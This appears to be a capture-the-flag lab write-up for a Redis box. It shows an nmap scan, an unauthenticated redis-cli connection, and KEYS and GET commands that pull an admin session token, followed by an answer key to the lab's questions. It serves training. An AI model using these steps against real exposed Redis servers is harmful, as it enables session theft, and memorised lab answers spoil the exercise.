# Reddict

Information Gathering

```
# sV gets the service version 
# -p 1-10000 scans ports 1 - 10000
```

```
┌─[root@hackerbox]─[~]
└──╼ #nmap -sV -p 1-10000 172.20.7.21
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-15 19:57 CDT
Nmap scan report for 172.20.7.21
Host is up (0.00026s latency).
Not shown: 9999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 6.0.16
MAC Address: 52:54:00:13:BC:88 (QEMU virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.62 seconds
```

We will try to connect to the redis service using the redis-cli -h command

```
┌─[root@hackerbox]─[~]
└──╼ #redis-cli -h 172.20.7.21
172.20.7.21:6379> PING
PONG
172.20.7.21:6379> 
```

We run INFO command to get info&#x20;

```
172.20.7.21:6379> INFO
# Server
redis_version:6.0.16
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:6d95e1af3a2c082a
redis_mode:standalone
os:Linux 5.10.0-26-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:383
run_id:963f81a1a01dd9274fb474fddd5973a09d403781
tcp_port:6379
uptime_in_seconds:621
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:7797284
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0

# Clients
connected_clients:1
client_recent_max_input_buffer:8
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0
clients_in_timeout_table:0

# Memory
used_memory:875440
used_memory_human:854.92K
used_memory_rss:15147008
used_memory_rss_human:14.45M
used_memory_peak:936048
used_memory_peak_human:914.11K
used_memory_peak_perc:93.53%
used_memory_overhead:830768
used_memory_startup:809672
used_memory_dataset:44672
used_memory_dataset_perc:67.92%
allocator_allocated:1371560
allocator_active:1708032
allocator_resident:4042752
total_system_memory:1985183744
total_system_memory_human:1.85G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.25
allocator_frag_bytes:336472
allocator_rss_ratio:2.37
allocator_rss_bytes:2334720
rss_overhead_ratio:3.75
rss_overhead_bytes:11104256
mem_fragmentation_ratio:18.19
mem_fragmentation_bytes:14314088
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:20496
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1752627127
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
module_fork_in_progress:0
module_fork_last_cow_size:0

# Stats
total_connections_received:3
total_commands_processed:5
instantaneous_ops_per_sec:0
total_net_input_bytes:100
total_net_output_bytes:26059
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
expire_cycle_cpu_milliseconds:11
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
tracking_total_keys:0
tracking_total_items:0
tracking_total_prefixes:0
unexpected_error_replies:0
total_reads_processed:8
total_writes_processed:5
io_threaded_reads_processed:0
io_threaded_writes_processed:0

# Replication
role:master
connected_slaves:0
master_replid:c159aace22607a59b64961202c994f0be52de5e7
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.743302
used_cpu_user:0.650746
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

# Modules

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=11,expires=0,avg_ttl=0
172.20.7.21:6379> 


```

The KEYS \* command is used to display all keys.

```
172.20.7.21:6379> KEYS *
 1) "session:user-893"
 2) "session:user-569"
 3) "session:user-800"
 4) "session:user-310"
 5) "session:user-552"
 6) "session:admin-001"
 7) "session:user-822"
 8) "session:user-111"
 9) "session:user-230"
10) "session:user-878"
11) "session:user-992"

```

Now we extract the admin info from the information above we will use session:admin-001

```
172.20.7.21:6379> GET "session:admin-001"
"{\"userID\": \"001\", \"lastLogin\": \"2023-12-10T10:10:01\", \"sessionToken\": \"iqtoggtry\", \"isLoggedIn\": true}"
```

We have extracted the admin token:&#x20;

```
iqtoggtry
```



Questions:

```
Which port(s) are open?
6379

What is the version number of the running Redis service?
6.0.16

What is the command-line utility lets you interact with a Redis database?
redis-cli

What is the response when the PING command is run after a successful connection is established?
PONG

What command returns information and statistics about the server?
INFO

Which command returns all keys?
KEYS *

How many key-value pairs are there?
11

Which command retrieves the value of the key?
GET

What is admin's sessionToken value?
iqtoggtry
```
